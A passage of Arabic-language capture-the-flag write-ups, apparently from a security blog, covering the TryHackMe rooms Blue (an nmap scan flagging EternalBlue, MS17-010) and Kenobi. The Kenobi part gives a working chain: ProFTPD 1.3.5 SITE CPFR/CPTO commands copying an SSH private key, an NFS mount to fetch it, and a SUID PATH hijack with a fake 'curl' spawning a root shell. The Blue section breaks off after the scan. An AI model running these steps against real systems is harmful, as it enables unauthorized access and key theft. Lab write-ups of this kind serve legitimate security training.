🔵 Blue — استغلال ثغرة EternalBlue (MS17-010) والتحكم الكامل

يناير 2025 وقت القراءة: 8 دقائق إعداد: محمد فتحي (Ft7y.Sec)

ملخص التحدي والبيئة المستهدفة

غرفة Blue على منصة TryHackMe تحاكي خادم Windows 7 SP1 مصاب بثغرة MS17-010 (EternalBlue) الشهيرة في تنفيذ الأوامر عن بُعد عبر بروتوكول SMBv1. الهدف هو استغلال الثغرة، ترقية الصلاحيات إلى NT AUTHORITY\SYSTEM، واستخراج ثلاثة أعلام موزعة في مسارات النظام.

المرحلة الأولى: الفحص والاستكشاف (Reconnaissance)

بدأنا بفحص المنافذ باستخدام Nmap لتحديد الخدمات واكتشاف قابلية النظام للإصابة بثغرة EternalBlue:

BASH — Nmap Vulnerability Scan
$ nmap -sV -sC -p 139,445 --script vuln 10.10.x.x

|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143

🐧 Kenobi — Samba, ProFTPD 1.3.5 & SUID Path Hijacking

فبراير 2025 وقت القراءة: 10 دقائق إعداد: محمد فتحي (Ft7y.Sec)

ملخص الآلة

آلة Linux تركز على التعداد العميق لمشاركات SMB و NFS، واستغلال أمر SITE CPFR/CPTO غير الموثق في خادم ProFTPD 1.3.5 لنسخ مفتاح SSH، ثم تصعيد الصلاحيات إلى Root عبر التلاعب بمتغير PATH في ملف تنفيذي SUID مخصص.

استغلال ثغرة ProFTPD (CVE-2015-3306)

BASH — ProFTPD Copy Commands
$ nc 10.10.x.x 21
220 ProFTPD 1.3.5 Server ready.
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

# ربط مشاركة /var عبر NFS واستخراج المفتاح
$ sudo mount 10.10.x.x:/var /mnt/kenobiNFS
$ cp /mnt/kenobiNFS/tmp/id_rsa . && chmod 600 id_rsa
$ ssh -i id_rsa kenobi@10.10.x.x

ترقية الصلاحيات إلى Root عبر SUID Path Hijacking

BASH — PrivEsc Path Injection
# فحص الملف بواسطة strings
kenobi@kenobi:~$ strings /usr/bin/menu
curl -I localhost
# يستدعي curl بدون مسار مطلق!

kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo "/bin/sh" > curl
kenobi@kenobi:/tmp$ chmod +x curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu
# النتيجة:
